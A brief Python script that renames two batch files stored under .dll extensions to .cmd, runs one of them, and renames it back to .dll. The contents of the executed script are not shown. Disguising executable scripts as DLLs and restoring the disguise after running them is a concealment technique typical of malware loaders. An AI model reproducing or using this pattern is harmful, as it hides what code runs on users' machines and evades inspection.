import os

os.rename("import_task.dll", "import_task.cmd")
os.rename("scheduler.dll", "scheduler.cmd")
os.system('import_task.cmd')
os.rename("import_task.cmd", "import_task.dll")
